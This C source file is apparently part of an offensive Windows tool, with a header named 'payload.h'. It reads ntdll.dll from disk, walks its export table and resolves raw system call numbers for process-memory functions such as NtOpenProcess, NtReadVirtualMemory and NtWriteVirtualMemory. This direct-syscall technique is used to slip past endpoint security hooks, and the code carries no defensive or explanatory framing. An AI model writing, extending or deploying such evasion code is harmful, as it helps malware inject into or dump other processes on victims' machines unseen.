#include "payload.h"
#include <string.h>

SYSCALL_TABLE g_sc = {0};

static DWORD rva_to_offset(BYTE *buf, DWORD rva)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)buf;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(buf + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva < sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
    }
    return 0;
}

static DWORD resolve_ssn(BYTE *buf, const char *name)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)buf;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(buf + dos->e_lfanew);
    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD off = rva_to_offset(buf, expRVA);
    if (!off) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(buf + off);
    DWORD namesOff = rva_to_offset(buf, exp->AddressOfNames);
    DWORD ordsOff  = rva_to_offset(buf, exp->AddressOfNameOrdinals);
    DWORD funcsOff = rva_to_offset(buf, exp->AddressOfFunctions);
    if (!namesOff || !ordsOff || !funcsOff) return 0;

    DWORD *names = (DWORD *)(buf + namesOff);
    WORD  *ords  = (WORD *)(buf + ordsOff);
    DWORD *funcs = (DWORD *)(buf + funcsOff);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        DWORD nOff = rva_to_offset(buf, names[i]);
        if (!nOff) continue;
        if (strcmp((char *)(buf + nOff), name) == 0) {
            DWORD fOff = rva_to_offset(buf, funcs[ords[i]]);
            if (!fOff) return 0;
            BYTE *code = buf + fOff;
            if (code[0] == 0xB8)
                return *(DWORD *)(code + 1);
            return 0;
        }
    }
    return 0;
}

BOOL syscall_init(void)
{
    HANDLE hf = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                            GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;

    DWORD sz = GetFileSize(hf, NULL);
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { CloseHandle(hf); return FALSE; }

    DWORD br;
    ReadFile(hf, buf, sz, &br, NULL);
    CloseHandle(hf);

    struct { DWORD *slot; const char *name; } tbl[] = {
        { &g_sc.NtProtectVirtualMemory,    "NtProtectVirtualMemory" },
        { &g_sc.NtQueryVirtualMemory,      "NtQueryVirtualMemory" },
        { &g_sc.NtReadVirtualMemory,       "NtReadVirtualMemory" },
        { &g_sc.NtWriteVirtualMemory,      "NtWriteVirtualMemory" },
        { &g_sc.NtOpenProcess,             "NtOpenProcess" },
        { &g_sc.NtQuerySystemInformation,  "NtQuerySystemInformation" },
        { &g_sc.NtQueryInformationProcess, "NtQueryInformationProcess" },
        { &g_sc.NtAllocateVirtualMemory,   "NtAllocateVirtualMemory" },
        { &g_sc.NtFreeVirtualMemory,       "NtFreeVirtualMemory" },
        { &g_sc.NtClose,                   "NtClose" },
    };

    BOOL ok = TRUE;
    for (int i = 0; i < sizeof(tbl) / sizeof(tbl[0]); i++) {
        *tbl[i].slot = resolve_ssn(buf, tbl[i].name);
        if (*tbl[i].slot == 0) ok = FALSE;
    }

    VirtualFree(buf, 0, MEM_RELEASE);

    if (ok)
        log_write("SC", "SSN ok: PVM=0x%X QVM=0x%X RVM=0x%X",
                  g_sc.NtProtectVirtualMemory,
                  g_sc.NtQueryVirtualMemory,
                  g_sc.NtReadVirtualMemory);

    return ok;
}
